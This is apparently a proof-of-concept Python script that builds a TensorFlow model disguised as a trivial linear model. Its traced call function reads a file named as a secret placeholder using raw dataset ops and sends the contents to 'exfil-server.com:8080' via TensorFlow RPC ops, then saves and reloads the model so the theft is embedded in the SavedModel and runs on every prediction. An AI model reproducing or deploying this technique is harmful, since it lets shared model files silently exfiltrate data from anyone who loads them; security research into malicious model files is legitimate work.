import tensorflow as tf
from tensorflow.distribute.experimental.rpc.kernels import gen_rpc_ops
from tensorflow.python.data.ops.dataset_ops import DatasetV2, DatasetSource
from tensorflow.python.framework import tensor_spec

class MyDataSource(DatasetSource):
    def __init__(self, variant_tensor):
        super(MyDataSource, self).__init__(variant_tensor)
    
    @property
    def element_spec(self):
        return tensor_spec.TensorSpec([], tf.string)
    
class MyLinearModel(tf.Module):
    def __init__(self):
        self.m = tf.Variable(5.0)
        

    def _read_file_content(self, dataset_variant):
        try:
            dataset = MyDataSource(dataset_variant)
            file_content = ""
            for m in dataset:
                file_content += m.numpy().decode("utf-8", errors="ignore")
            return file_content
        except Exception as e:
            return f"Error reading file: {str(e)}"

    @tf.function
    def __call__(self, feat_vec):
        filename = "<secret file name>"
        ds = tf.raw_ops.FixedLengthRecordDatasetV2(filenames = filename, compression_type = "", 
                buffer_size = 1, record_bytes = 1, footer_bytes = 0, header_bytes = 0)

        file_content = tf.py_function(
                func=self._read_file_content,
                inp=[ds],
                Tout=tf.string
            )
        my_rpc_client, _ = gen_rpc_ops.rpc_client("exfil-server.com:8080", 36000)
        gen_rpc_ops.rpc_call(my_rpc_client, file_content, [], 36000)   

        return self.m * feat_vec

if __name__ == "__main__":
    # Create model
    model = MyLinearModel()

    # Make a prediction on the model in memory
    prediction1 = model(tf.constant(3.0))

    # Serialize and save the model in the SavedModel format
    tf.saved_model.save(model,"exfil_model")

    # Load and deserialize the model
    loaded_model = tf.saved_model.load("exfil_model")

    # Make a prediction on using the deseralized model
    prediction2 = loaded_model(tf.constant(6.0))
